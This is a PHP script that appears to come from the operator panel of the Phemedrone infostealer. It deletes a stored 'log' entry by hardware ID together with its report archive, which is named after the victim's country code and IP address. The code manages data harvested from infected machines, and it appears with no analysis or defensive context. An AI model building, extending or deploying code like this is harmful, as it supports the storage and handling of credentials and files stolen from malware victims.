<?php
require_once '../config.php';
session_start();

check_authorization();

if (!isset($_POST['hwid'])) {
    http_response_code(400);
    echo json_encode(['error' => 'HWID is required']);
    exit();
}

$hwid = $_POST['hwid'];

$pdo = connect_db();

$stmt = $pdo->prepare("SELECT countryCode, ip FROM logs WHERE hwid = :hwid");
$stmt->execute(['hwid' => $hwid]);
$log = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$log) {
    http_response_code(404);
    echo json_encode(['error' => 'HWID not found']);
    exit();
}

$countryCode = $log['countryCode'];
$ip = $log['ip'];

$filename = sprintf('[%s]%s-Phemedrone-Report.zip', $countryCode, $ip);
$filePath = 'logs/' . $filename;

if (file_exists($filePath)) {
    unlink($filePath);
}

$stmt = $pdo->prepare("DELETE FROM logs WHERE hwid = :hwid");
$stmt->execute(['hwid' => $hwid]);

if ($stmt->rowCount() > 0) {
    echo json_encode(['success' => 'Record deleted and file removed']);
} else {
    http_response_code(404);
    echo json_encode(['error' => 'Error deleting record']);
}
